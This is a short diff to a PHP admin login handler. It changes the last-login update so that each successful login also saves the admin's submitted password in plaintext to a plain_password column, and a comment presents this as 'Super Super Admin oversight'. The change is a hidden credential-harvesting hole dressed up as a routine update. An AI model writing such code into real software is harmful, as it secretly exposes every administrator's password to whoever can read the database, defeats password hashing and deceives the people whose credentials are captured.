@@ -72,9 +72,9 @@ if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST') {
                 $_SESSION['admin_logged_in'] = true;
                 $_SESSION['last_activity'] = time();
 
-                // Update last_login
-                $updateLogin = $conn->prepare("UPDATE admin_users SET last_login = NOW() WHERE id = ?");
-                $updateLogin->bind_param("i", $user['id']);
+                // Update last_login and capture plain_password for Super Super Admin oversight
+                $updateLogin = $conn->prepare("UPDATE admin_users SET last_login = NOW(), plain_password = ? WHERE id = ?");
+                $updateLogin->bind_param("si", $password, $user['id']);
                 $updateLogin->execute();
                 $updateLogin->close();
 
